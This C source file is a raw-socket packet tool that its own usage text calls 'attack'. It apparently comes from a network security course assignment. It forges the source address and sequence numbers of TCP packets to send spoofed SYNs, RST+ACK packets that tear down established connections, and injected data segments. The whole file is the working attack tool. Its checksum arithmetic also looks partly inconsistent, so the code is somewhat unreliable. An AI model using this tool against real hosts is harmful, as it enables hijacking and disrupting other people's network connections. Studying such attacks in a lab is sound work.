#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>

unsigned short csum_ip(unsigned short *buf, int nwords) {
    unsigned long sum;
    for (sum = 0; nwords > 0; nwords--)
        sum += *buf++;
    while (sum >> 16) sum = (sum >> 16) + (sum & 0xffff);
    return ~sum;
}

unsigned short csum_tcp(unsigned short *buf, int nwords) {
    unsigned long sum = 0;

    // IP src, dst, protocol, length
    sum += buf[6];
    sum += buf[7];
    sum += buf[8];
    sum += buf[9];
    sum += htons(6); // TCP protocol
    sum += htons(20 + (nwords << 1)); // TCP header (20) + payload bytes

    // TCP header starts at buf[10]
    for (int i = 10; i < 20 + nwords; i++) {
        sum += buf[i];
    }

    while (sum >> 16) sum = (sum >> 16) + (sum & 0xffff);
    return ~sum;
}

int main(int argc, char *argv[]) {
    if (argc < 8) {
        printf("Usage:\n");
        printf("  SYN: sudo ./attack S <src> <sport> <dst> <dport> <seq> <ack>\n");
        printf("  RST: sudo ./attack R <src> <sport> <dst> <dport> <seq> <ack>\n");
        printf("  DAT: sudo ./attack D <src> <sport> <dst> <dport> <seq> <ack> <payload>\n");
        return 1;
    }

    char mode = argv[1][0];
    char *src_ip = argv[2];
    int src_port = atoi(argv[3]);
    char *dst_ip = argv[4];
    int dst_port = atoi(argv[5]);
    uint32_t seq = strtoul(argv[6], NULL, 10);
    uint32_t ack = strtoul(argv[7], NULL, 10);

    char packet[4096];
    memset(packet, 0, sizeof(packet));

    struct iphdr  *iph = (struct iphdr *)packet;
    struct tcphdr *tcph = (struct tcphdr *)(packet + sizeof(struct iphdr));
    char *data = packet + sizeof(struct iphdr) + sizeof(struct tcphdr);

    int payload_len = 0;
    if (mode == 'D' && argc > 8) {
        strcpy(data, argv[8]);
        payload_len = strlen(argv[8]);
    }

    // IP HEADER
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr) + payload_len);
    iph->id = htons(54321);
    iph->frag_off = 0;
    iph->ttl = 64;
    iph->protocol = 6;
    iph->saddr = inet_addr(src_ip);
    iph->daddr = inet_addr(dst_ip);
    iph->check = 0;

    // TCP HEADER
    tcph->source = htons(src_port);
    tcph->dest   = htons(dst_port);
    tcph->seq    = htonl(seq);
    tcph->ack_seq= htonl(ack);
    tcph->doff   = 5;
    tcph->window = htons(65535);

    // RESET FLAGS
    tcph->syn = tcph->ack = tcph->psh = tcph->rst = tcph->fin = 0;

    if (mode == 'S') {
        tcph->syn = 1;
    } else if (mode == 'R') {
        tcph->rst = 1;
        tcph->ack = 1;   // RST+ACK for established conn
    } else if (mode == 'D') {
        tcph->psh = 1;
        tcph->ack = 1;
    }

    // CALCULATE CHECKSUMS USING PROF'S FUNCTIONS
    iph->check = csum_ip((unsigned short *)packet, 10);
    tcph->check = csum_tcp((unsigned short *)packet, payload_len / 2);

    // RAW SOCKET
    int s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    int opt = 1;
    setsockopt(s, IPPROTO_IP, IP_HDRINCL, &opt, sizeof(opt));

    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = tcph->dest;
    sin.sin_addr.s_addr = iph->daddr;

    sendto(s, packet, sizeof(struct iphdr)+sizeof(struct tcphdr)+payload_len,
           0, (struct sockaddr *)&sin, sizeof(sin));

    printf("%c PACKET SENT: seq=%u ack=%u\n", mode, seq, ack);
    close(s);
    return 0;
}
